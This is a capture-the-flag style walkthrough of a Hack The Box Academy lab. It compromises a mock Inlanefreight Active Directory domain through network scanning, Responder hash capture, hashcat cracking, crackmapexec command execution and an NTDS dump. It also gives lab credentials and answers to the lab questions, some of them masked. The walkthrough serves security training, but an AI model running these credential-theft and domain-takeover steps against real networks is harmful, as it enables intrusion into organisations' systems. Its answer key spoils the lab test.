# [Documentation & Reporting](https://academy.hackthebox.com/module/details/162)

## Practice Lab - Pivoting, Tunneling, and Port Forwarding

> You are an assessor for Acme Security, Ltd. Your team has been hired to perform an internal penetration test against one of Inlanefreight's internal networks. The tester assigned to the project had to go out on leave unexpectedly, so you have been tasked by your manager with taking over the assessment. You've had limited communication with the tester, and all of their notes are left on the testing VM configured within the internal network. The scope provided by the client is as follows:
- Network range: `172.16.5.0/24`
- Domain: `INLANEFREIGHT.LOCAL`

> Your teammate has already created a directory structure and detailed Obsidian notebook to record their testing activities. They made a list of `13 findings` but only recorded evidence for a few of them. Step in as the penetration tester and complete this mock engagement to the best of your abilities. Experiment with the following to refine your skills:
- Set up Tmux logging and record all of your evidence using Tmux while getting more comfortable with the tool
- Enumerate and exploit all 13 findings listed and gather evidence for the findings that don't have any evidence recorded in the notebook
- Keep a detailed log of all activities you perform
- Update the payload log as needed
- Log all scan and tool output generated while performing enumeration and gathering additional finding evidence
- Practice writing up the findings using either WriteHat or the provided reporting template, or practice with both.
- Finish the penetration test and complete the questions below to conclude this module.

> RDP to `10.129.185.247` (`ACADEMY-DOCRPT-PAR01`) with user `htb-student` and password "HTB_@cademy_stdnt!".

Questions:
1. Complete the in-progress penetration test. Once you achieve Domain Admin level access, submit the contents of the `flag.txt` file on the Administrator Desktop on the `DC01` host. `d0c_p*****************`
2. After achieving Domain Admin, submit the NTLM hash of the `KRBTGT` account. `16e26***************************`
3. Dump the NTDS file and perform offline password cracking. Submit the password of the `svc_reporting` user as your answer. `Reporter1!`
4. What powerful local group does this user belong to? `Backup Operators`


```
┌──(nabla㉿kali)-[~]
└─$ ssh htb-student@10.129.185.247

htb-student@10.129.185.247's password:
Linux par01 5.15.0-15parrot1-amd64 #1 SMP Debian 5.15.15-15parrot2 (2022-02-15) x86_64

[SNIP]

┌─[htb-student@par01]─[~]
└──╼ $
```

```
┌─[htb-student@par01]─[~]
└──╼ $ ifconfig | grep 'inet' -B1 | grep -v 'inet6'

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.51.162  netmask 255.255.0.0  broadcast 10.129.255.255
--
ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.225  netmask 255.255.254.0  broadcast 172.16.5.255

[SNIP]
```

```
┌─[htb-student@par01]─[~]
└──╼ $ sudo nmap -sn 172.16.5.0/24 -T4 | grep 'Nmap scan report for' | cut -d ' ' -f 5-

[SNIP]

inlanefreight.local (172.16.5.5)
172.16.5.127
172.16.5.130
172.16.5.200
172.16.5.225
```

```
┌─[htb-student@par01]─[~]
└──╼ $ sudo nmap -Pn -sS 172.16.5.0/24 -T4

[SNIP]

Nmap scan report for inlanefreight.local (172.16.5.5)

PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

[SNIP]

Nmap scan report for 172.16.5.127

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

[SNIP]

Nmap scan report for 172.16.5.130

PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

[SNIP]

Nmap scan report for 172.16.5.200

PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy

[SNIP]

Nmap scan report for 172.16.5.225

PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   filtered http
443/tcp  filtered https
3389/tcp open     ms-wbt-server
```

```
┌─[htb-student@par01]─[~]
└──╼ $ crackmapexec smb 172.16.5.0/24

SMB         172.16.5.5      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.130    445    FILE01           [*] Windows 10.0 Build 17763 x64 (name:FILE01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.5.200    445    DEV01            [*] Windows 10.0 Build 17763 x64 (name:DEV01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
```

```
┌─[htb-student@par01]─[~]
└──╼ $ echo -e '172.16.5.5\tDC01.INLANEFREIGHT.LOCAL INLANEFREIGHT.LOCAL\n172.16.5.130\tFILE01.INLANEFREIGHT.LOCAL\n172.16.5.200\tDEV01.INLANEFREIGHT.LOCAL' | sudo tee -a /etc/hosts

172.16.5.5	    DC01.INLANEFREIGHT.LOCAL INLANEFREIGHT.LOCAL
172.16.5.130	FILE01.INLANEFREIGHT.LOCAL
172.16.5.200	DEV01.INLANEFREIGHT.LOCAL
```

```
┌─[htb-student@par01]─[~]
└──╼ $ sudo responder -I ens224 -wrvf

[SNIP]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
[SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:1dcdf0c3eb6c6040:9428907113BEC39BF8C4250AFC568ED9:0101000000000000009D91FD3C50DB014B2AA534323919E7000000000200080059004E005600420001001E00570049004E002D005A00340036004200500047004100460057005200480004003400570049004E002D005A0034003600420050004700410046005700520048002E0059004E00560042002E004C004F00430041004C000300140059004E00560042002E004C004F00430041004C000500140059004E00560042002E004C004F00430041004C0007000800009D91FD3C50DB0106000400020000000800300030000000000000000000000000300000C89EA7486855F5CDAEDDE56A1477B97E342B9B82986FAD5209E73A12D6275FE00A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
```

```
┌──(nabla㉿kali)-[~]
└─$ hashcat -m 5600 backupagent.hash /usr/share/wordlists/rockyou.txt

[SNIP]

BACKUPAGENT::INLANEFREIGHT:1dcdf0c3eb6c6040:9428907113bec39bf8c4250afc568ed9:0101000000000000009d91fd3c50db014b2aa534323919e7000000000200080059004e005600420001001e00570049004e002d005a00340036004200500047004100460057005200480004003400570049004e002d005a0034003600420050004700410046005700520048002e0059004e00560042002e004c004f00430041004c000300140059004e00560042002e004c004f00430041004c000500140059004e00560042002e004c004f00430041004c0007000800009d91fd3c50db0106000400020000000800300030000000000000000000000000300000c89ea7486855f5cdaedde56a1477b97e342b9b82986fad5209e73a12d6275fe00a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:Recovery7

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
```

```
┌─[htb-student@par01]─[~]
└──╼ $ crackmapexec smb 172.16.5.5 -u backupagent -p 'Recovery7'

[SNIP]

SMB         172.16.5.5      445    DC01             [+] INLANEFREIGHT.LOCAL\backupagent:Recovery7 (Pwn3d!)
```

```yaml
credentials:
    username: INLANEFREIGHT.LOCAL\backupagent
    password: 'Recovery7'
    host: 172.16.5.5 (DC01)
    port: 445 (SMB)
```

```
┌─[htb-student@par01]─[~]
└──╼ $ sudo crackmapexec smb 172.16.5.5 -u backupagent -p 'Recovery7' -X 'net user backupagent'

[SNIP]

SMB         172.16.5.5      445    DC01             Local Group Memberships      *Backup Operators
SMB         172.16.5.5      445    DC01             Global Group memberships     *Domain Admins        *Domain Users
```

```
┌─[htb-student@par01]─[~]
└──╼ $ sudo crackmapexec smb 172.16.5.5 -u backupagent -p 'Recovery7' -X 'type c:\users\administrator\desktop\flag.txt'

[SNIP]

SMB         172.16.5.5      445    DC01             d0c_p***************** 📌
```

```
┌─[htb-student@par01]─[~]
└──╼ $ sudo crackmapexec smb 172.16.5.5 -u backupagent -p 'Recovery7' --ntds --user krbtgt

[SNIP]

SMB         172.16.5.5      445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26***************************::: 📌
```

```
┌─[htb-student@par01]─[~]
└──╼ $ sudo crackmapexec smb 172.16.5.5 -u backupagent -p 'Recovery7' --ntds --user svc_reporting

[SNIP]

SMB         172.16.5.5      445    DC01             svc_reporting:7608:aad3b435b51404eeaad3b435b51404ee:a6d3701ae426329951cf5214b7531140:::
```

```
┌──(nabla㉿kali)-[~]
└─$ hashcat -m 1000 'a6d3701ae426329951cf5214b7531140' /usr/share/wordlists/rockyou.txt

[SNIP]

a6d3701ae426329951cf5214b7531140:Reporter1! 📌

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
```

```
┌─[htb-student@par01]─[~]
└──╼ $ sudo crackmapexec smb 172.16.5.5 -u svc_reporting -p 'Reporter1!'

[SNIP]

SMB         172.16.5.5      445    DC01             [+] INLANEFREIGHT.LOCAL\svc_reporting:Reporter1!
```

```yaml
credentials:
    username: INLANEFREIGHT.LOCAL\svc_reporting
    password: 'Reporter1!'
    host: 172.16.5.5 (DC01)
    port: 445 (SMB)
```

```
┌─[htb-student@par01]─[~]
└──╼ $ sudo crackmapexec smb 172.16.5.5 -u backupagent -p 'Recovery7' -x 'net user svc_reporting'

[SNIP]

SMB         172.16.5.5      445    DC01             Local Group Memberships      *Backup Operators 📌
SMB         172.16.5.5      445    DC01             Global Group memberships     *Domain Users
```

---
---
